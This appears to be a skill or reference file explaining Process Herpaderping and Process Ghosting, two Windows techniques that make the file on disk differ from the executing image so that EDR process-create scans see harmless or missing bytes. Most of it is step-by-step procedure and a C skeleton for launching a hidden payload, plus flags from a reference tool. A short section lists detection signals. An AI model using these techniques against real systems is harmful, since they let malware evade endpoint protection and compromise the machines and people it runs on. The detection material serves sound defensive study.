---
name: process-herpaderping-ghosting
description: Process Herpaderping (modify file after image mapping) and Process Ghosting (delete-pending + section create) -- disk/memory image mismatch techniques that fool EDR process-create callbacks.
---

# Process Herpaderping and Process Ghosting

Two related image-tampering techniques that break the assumption `kernel process-notify callbacks
see the same bytes an analyst sees on disk`. Both abuse the gap between **file-on-disk** state and
**mapped image section** state at the moment the process-create notification fires in the kernel.

## Attack Target: PsSetCreateProcessNotifyRoutineEx

When a new process is created, the kernel fires
`PsSetCreateProcessNotifyRoutineEx` callbacks. Most EDRs use this to:
1. Scan the backing file by handle / path.
2. Compute a hash and look it up in a known-good / known-bad database.
3. Decide whether to allow the process to run.

Both techniques below make the file on disk **not match** what will execute, so the EDR's scan hits
innocent bytes while malicious bytes already live in the process's image section.

## 1. Process Herpaderping (Johnny Shaw, 2020)

Reference impl: <https://github.com/jxy-s/herpaderping>.

### Steps

```
1. Write target binary (the real payload) to a temp file. Keep file handle open.
2. NtCreateSection(SEC_IMAGE, hFile)      -> image section cached in kernel
3. NtCreateProcessEx(sectionHandle, ...)  -> process object exists but no thread yet
4. Using the SAME open handle, overwrite the file with innocent bytes
   (e.g. notepad.exe, a signed MS binary, random pattern).
5. NtCreateThreadEx(entryPoint)           -> KERNEL CALLBACK FIRES HERE
   At this instant, inspection of the file on disk returns INNOCENT BYTES,
   but the mapped image section (and about-to-execute code) is the PAYLOAD.
6. CloseHandle(hFile)   -> IRP_MJ_CLEANUP; subsequent on-disk inspection sees innocent file.
```

The EDR's post-create scan reads the file (step 5 or step 6 timing) and reports the hash of
the **innocent** bytes. Attribution is misdirected -- the process will show up in logs as whatever
you overwrote the file with.

### Why it works

Windows prevents many file operations on an actively mapped image:
- `FILE_WRITE_DATA` + `CREATE_ALWAYS` on a mapped image returns `ERROR_SHARING_VIOLATION`.
- `FILE_DELETE_ON_CLOSE` on a mapped image's handle returns `ERROR_SHARING_VIOLATION`.

**But**, writes through the **existing open handle** that already had `GENERIC_WRITE` are allowed
after the section is created, because they go through the same file object. The protection is
against *new* handles, not writes through the one you already have.

### Simplified skeleton

```c
HANDLE hFile = CreateFileW(target, GENERIC_READ | GENERIC_WRITE,
    FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, 0, CREATE_ALWAYS,
    FILE_ATTRIBUTE_NORMAL, 0);

// write real payload
CopyFileByHandle(hPayloadFile, hFile);

HANDLE hSection = 0;
NtCreateSection(&hSection, SECTION_ALL_ACCESS, 0, 0, PAGE_READONLY, SEC_IMAGE, hFile);

HANDLE hProcess = 0;
NtCreateProcessEx(&hProcess, PROCESS_ALL_ACCESS, 0, NtCurrentProcess(),
                  PROCESS_CREATE_FLAGS_INHERIT_HANDLES, hSection, 0, 0, 0);

// NOW: overwrite the file on disk with innocent bytes through the SAME handle
CopyFileByHandle(hInnocentFile, hFile);  // same hFile!

/* set up PEB->ProcessParameters, resolve entry point, etc. */

HANDLE hThread = 0;
NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, 0, hProcess,
                 (PVOID)entryPoint, 0, 0, 0, 0, 0, 0);
// Kernel fires PsCreateProcessNotify here -- EDR scans INNOCENT file.

CloseHandle(hFile);
```

### Flags (from the reference impl)

- `FlagHoldHandleExclusive` -- keep handle open with no sharing, extends window of mismatch.
- `FlagCloseFileEarly` -- close before thread creation, EDR sees deleted / fully-overwritten file.
- `FlagFlushFile` -- `FlushFileBuffers` after overwrite, guarantees the new bytes hit disk before
  callback.
- `FlagDirectory` -- target an alternate data stream (`dir:exe`) so the host file name looks like a
  directory.

## 2. Process Ghosting (Gabriel Landau, 2021)

Blog: <https://www.elastic.co/security-labs/process-ghosting-a-new-executable-image-tampering-attack>

### Core trick

Windows protection against image modification only applies **after** `NtCreateSection(SEC_IMAGE)`.
Before the section is created, the file is "just a file" -- and more importantly, a file placed in
**delete-pending state** can be mapped as an image, then deleted while still being used as a section
backing.

### Steps

```
1. CreateFile(target, GENERIC_WRITE, 0, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
2. NtSetInformationFile(hFile, FILE_DISPOSITION_INFORMATION{ DeleteFile = TRUE })
      -> file is now in DELETE-PENDING state
      -> external opens fail with STATUS_DELETE_PENDING
      -> the file will be deleted when the LAST handle closes
3. WriteFile(hFile, payload, size, ...);
      -> write succeeds; content lives in filesystem cache even though file is pending-delete
4. NtCreateSection(SEC_IMAGE, hFile)
      -> image section created backed by the pending-delete file
5. CloseHandle(hFile);
      -> FILE IS DELETED. The section still points at cached pages in memory.
6. NtCreateProcessEx(sectionHandle, ...);
      -> process backed by a FILELESS image.
7. NtCreateThreadEx(entryPoint);
      -> runs. Kernel callback tries to scan the backing file -- FILE DOES NOT EXIST.
```

### Why it works

- `FILE_DISPOSITION_INFORMATION::DeleteFile = TRUE` marks the file; delete is deferred to last-handle-close.
- Writes still succeed through the open handle.
- `NtCreateSection(SEC_IMAGE)` with a delete-pending file is explicitly allowed.
- After `CloseHandle`, filesystem removes the directory entry, but the section object retains an
  internal reference to the file control block, keeping the cached pages alive.
- Process creation finishes, EDR tries to scan backing file -> gone.

## Detection

- The `MiniFilter` layer (`FltFilterLoad` style minidriver) can observe `IRP_MJ_SET_INFORMATION` +
  `FileDispositionInformation` immediately followed by `IRP_MJ_WRITE` + `NtCreateSection` on the
  same file -- a tell.
- `PsSetCreateProcessNotifyRoutineEx2` (Win10+) receives a `PS_CREATE_NOTIFY_INFO` struct that
  includes a backing-file-not-found indicator for Ghosting cases.
- `ETW::Microsoft-Windows-Kernel-Process` emits `ProcessStart` events with `FileObject` NULL for
  fileless sections -- flag.
- Signed-image enforcement (Device Guard / CI with `WDAC`) prevents the attacker from creating any
  section from a non-whitelisted file at all.

## Related

- `Process Doppelgänging` -- Herpaderping's older cousin, abuses NTFS transactions
  (`CreateTransaction` + `CreateFileTransacted`). Patched in modern Windows but still works on 2016.
- `Process Reimaging` -- changes the file path reported by `GetProcessImageFileName` after process
  creation; different trick, same philosophical goal.
- `Process Hollowing` -- unmap legitimate image and replace with payload inside running process;
  more mature but much louder (`NtUnmapViewOfSection` + `WriteProcessMemory` on code regions).
